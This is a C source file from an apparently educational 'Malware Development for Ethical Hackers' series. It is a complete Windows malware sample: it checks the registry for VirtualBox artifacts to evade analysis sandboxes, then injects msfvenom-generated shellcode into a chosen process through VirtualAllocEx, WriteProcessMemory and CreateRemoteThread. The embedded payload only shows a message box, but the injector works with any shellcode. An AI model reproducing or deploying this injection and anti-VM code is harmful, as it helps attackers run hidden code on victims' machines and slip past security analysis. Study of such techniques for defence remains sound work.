/*
 * Malware Development for Ethical Hackers
 * hack.c - Anti-VM tricks
 * delaying execution
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// msfvenom -p windows/x64/messagebox TEXT="Hello, Packt!" TITLE="=^..^=" -f c
unsigned char myPayload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
"\x4c\x8d\x85\x0c\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
"\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x50\x61\x63\x6b\x74\x21"
"\x00\x3d\x5e\x2e\x2e\x5e\x3d\x00";

unsigned int myPayloadLen = sizeof(myPayload);

int checkRegistryKey(HKEY rootKey, char* subKeyName) {
  HKEY registryKey = nullptr;
  LONG result = RegOpenKeyExA(rootKey, subKeyName, 0, KEY_READ, &registryKey);
  if (result == ERROR_SUCCESS) {
    RegCloseKey(registryKey);
    return TRUE;
  }
  return FALSE;
}

int compareRegistryKeyValue(HKEY rootKey, char* subKeyName, char* registryValue, char* comparisonValue) {
  HKEY registryKey = nullptr;
  LONG result;
  char value[1024];
  DWORD size = sizeof(value);
  result = RegOpenKeyExA(rootKey, subKeyName, 0, KEY_READ, &registryKey);
  if (result == ERROR_SUCCESS) {
    RegQueryValueExA(registryKey, registryValue, NULL, NULL, (LPBYTE)value, &size);
    if (result == ERROR_SUCCESS) {
      if (strcmp(value, comparisonValue) == 0) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

int main(int argc, char* argv[]) {
  HANDLE processHandle; // Process handle
  HANDLE remoteThread;  // Remote thread
  PVOID remoteBuffer;   // Remote buffer

  if (checkRegistryKey(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\FADT\\VBOX__")) {
    printf("VirtualBox VM registry path value detected :(\n");
    // return -2;
  }

  if (compareRegistryKeyValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
    "SystemProductName", "VirtualBox")) {
    printf("VirtualBox VM registry key value detected :(\n");
    // return -2;
  }

  if (compareRegistryKeyValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SystemInformation",
    "BiosVersion", "VirtualBox")) {
    printf("VirtualBox VM BIOS version detected :(\n");
    return -2;
  }

  // Parse process ID
  printf("PID: %i", atoi(argv[1]));
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // Allocate memory buffer for remote process
  remoteBuffer = VirtualAllocEx(processHandle, NULL, myPayloadLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "Copy" data between processes
  WriteProcessMemory(processHandle, remoteBuffer, myPayload, myPayloadLen, NULL);

  // Our process starts a new thread
  remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(processHandle);
  return 0;
}
